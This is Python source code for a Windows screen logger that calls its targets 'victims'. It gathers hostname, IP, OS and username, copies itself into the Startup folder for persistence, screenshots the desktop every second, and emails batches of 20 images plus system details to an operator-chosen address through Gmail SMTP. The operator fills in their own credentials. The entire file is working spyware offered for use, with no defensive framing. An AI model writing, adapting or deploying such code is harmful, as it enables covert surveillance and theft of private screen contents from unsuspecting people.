#------IMPORT------#
import pyautogui
import time
import socket
import os
import smtplib
import shutil
import platform
from email.message import EmailMessage

#------VICTIM INFORMATION------#

# -- Get System Info:
system = platform.platform()
# -- Get Hostname:
hostname = socket.gethostname()
# -- Get IP:
ip = socket.gethostbyname(hostname)
# -- Get where the .exe was opened:
dir = os.getcwd()
# -- Get User:
user = (os.getlogin())

#------FUNCTIONS------#

# -- Copy to StartUp:
def copystartup():
 originalfilename = "screenloger-by-sousa.exe" #    Name of the original .exe file of the code (If you covert)
 coppiedfilename = 'testestartup-NOMEALTERADO.exe' #     Name of the .exe file that will be copied
 copytodir = 'C://Users//' + user + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
 copyfromdir = dir + "\\" + originalfilename

 filesindir = os.listdir(copytodir)

 if coppiedfilename not in filesindir:
    try:
        shutil.copy2(copyfromdir, copytodir + coppiedfilename)
    except Exception as e:
        print (e)

    except Exception as e:
        print (e)    
# -- Send Mail:
def send_mail():
    try:
        msg = EmailMessage()
        msg["From"] = "emailsender" #Change to your Email
        msg["To"] = "emailreceiver" #Change to the EMail that will receive the Logs!
        msg["Subject"] = ("🕵🏻 - User Grabbed : " + str(hostname))

        #-------STRUCTURE OF EMAIL TEXTS-----------#

        body = ("ℹ️ - LOG INFORMATIONS:" + "\n\n🖥️ | Victim HOSTNAME : " + str(hostname) +"\n⚙️ | System : " + str(system) + "\n📍 | IP : " + str(ip)) #     Email text = (User,Hostnamem,System,Ip)
        msg.set_content(body)

        images = os.listdir("IMAGES")
        path = "C:\\IMAGES\\" #     Name of the folder where the pics will be stored
        for image in images:
            file = open(path+image, "rb")
            data = file.read()
            file_name = file.name
            msg.add_attachment(data, maintype = 'image', subtype = "png", filename = file_name)
            file.close()

        server = smtplib.SMTP('smtp.gmail.com', 587) #  SMTP OF GMAIL
        server.ehlo()
        server.starttls()
        server.login("email", "apppasword") #    Change to your email and App Password
        server.send_message(msg)

        server.close()
        shutil.rmtree("IMAGES")
    except Exception as mail_error:
        shutil.rmtree("IMAGES")
        pass
# -- Take Pic:
def takepik():
    
 count = 0
 os.chdir("C:\\")
 if "IMAGES" in os.listdir("C:"):
     send_mail()
 else:
     os.mkdir("C:IMAGES")
 while True:
     if "IMAGES" not in os.listdir("C:"):
         os.mkdir('C:IMAGES')
     pic = pyautogui.screenshot()
     pic.save("C:IMAGES\\PIC-"+str(count)+".png") #  Name of images
     count += 1
     if count >= 20: #  Number of images in each email (20)
         send_mail()
         count = 0
     time.sleep(1) #   Time between each printscreen (1s Delay)

#------------#

copystartup()
takepik()
